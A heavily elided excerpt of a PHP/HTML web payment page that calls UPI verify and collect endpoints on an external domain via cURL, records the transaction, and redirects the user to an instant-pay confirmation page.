...
<head>
    ...
    <title>paytm.onoinvestPayments</title>
    <style>
        body {
            background: #667eea;
...
// Set cURL options
curl_setopt($ch, CURLOPT_URL, 'https://liveipl.live/HDFCSoft/upiverify');
...
if ($responseArray['status']==="Success"){
    ...
    // Endpoint URL
$url = 'https://liveipl.live/HDFCSoft/upicollect';
$params = array(
...
if ($stmt->execute()) {
    ...
    header("Location: https://liveipl.live/payment/instant-pay/confirm/$link_token");
    ...
    window.onload = function() {
        Swal.fire({
            ...
            if (result.dismiss === Swal.DismissReason.timer) {
                window.location.href = "https://liveipl.live/payment/instant-pay/'.$link_token.'"; // Redirect to instant-pay with link token
            }
        });
    }
</script>';
